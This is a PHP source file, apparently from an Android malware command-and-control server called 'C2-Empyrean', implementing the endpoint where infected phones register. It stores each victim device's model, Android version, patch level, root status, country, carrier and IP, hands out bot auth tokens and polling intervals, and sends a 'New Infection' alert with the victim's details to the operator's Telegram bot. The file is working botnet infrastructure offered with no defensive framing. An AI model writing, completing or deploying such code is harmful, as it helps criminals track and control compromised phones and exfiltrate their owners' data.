<?php
/**
 * C2-Empyrean - API: Device Registration
 * POST /api/register
 * Body: { "device_id": "...", "model": "...", "android_version": "...", ... }
 * No JWT required - device-facing endpoint
 */

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input || empty($input['device_id'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Device ID required']);
    exit;
}

$deviceId = $input['device_id'];
$now = time();

// Check if already registered
$devices = $db->read('devices');
foreach ($devices as $d) {
    if (($d['device_id'] ?? '') === $deviceId) {
        // Already registered - return existing auth token
        echo json_encode([
            'success' => true,
            'data' => [
                'device_id' => $deviceId,
                'auth_token' => $d['auth_token'],
                'message' => 'Device already registered',
            ],
        ]);
        exit;
    }
}

// Generate auth token
$authToken = bin2hex(random_bytes(32));

// Build device record
$deviceRecord = [
    'device_id' => $deviceId,
    'auth_token' => $authToken,
    'model' => $input['model'] ?? 'Unknown',
    'manufacturer' => $input['manufacturer'] ?? 'Unknown',
    'android_version' => $input['android_version'] ?? 'Unknown',
    'api_level' => $input['api_level'] ?? 0,
    'security_patch' => $input['security_patch'] ?? 'Unknown',
    'country' => $input['country'] ?? 'Unknown',
    'operator' => $input['operator'] ?? 'Unknown',
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
    'battery_level' => $input['battery'] ?? 0,
    'is_charging' => $input['charging'] ?? false,
    'is_rooted' => $input['rooted'] ?? false,
    'is_online' => true,
    'first_seen' => $now,
    'last_seen' => $now,
    'heartbeat_count' => 0,
    'total_data_sent' => 0,
    'total_data_received' => 0,
    'tags' => [],
    'notes' => '',
];

$db->insert('devices', $deviceRecord);

// Notify Telegram about new infection
$telegramToken = TELEGRAM_BOT_TOKEN;
$telegramChatId = TELEGRAM_ADMIN_CHAT_ID;
if ($telegramToken && $telegramChatId) {
    $message = "🚨 *New Infection* 🚨\n";
    $message .= "Device: `{$deviceId}`\n";
    $message .= "Model: {$deviceRecord['model']}\n";
    $message .= "Android: {$deviceRecord['android_version']}\n";
    $message .= "Country: {$deviceRecord['country']}\n";
    $message .= "IP: `{$deviceRecord['ip']}`\n";
    $message .= "Time: " . date('Y-m-d H:i:s T', $now);

    $telegramUrl = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $telegramPayload = [
        'chat_id' => $telegramChatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true,
    ];

    // Fire and forget
    $ch = curl_init($telegramUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($telegramPayload),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_CONNECTTIMEOUT => 3,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

echo json_encode([
    'success' => true,
    'data' => [
        'device_id' => $deviceId,
        'auth_token' => $authToken,
        'server_time' => $now,
        'heartbeat_interval' => HEARTBEAT_INTERVAL,
        'command_poll_interval' => COMMAND_POLL_INTERVAL,
        'message' => 'Device registered successfully',
    ],
]);
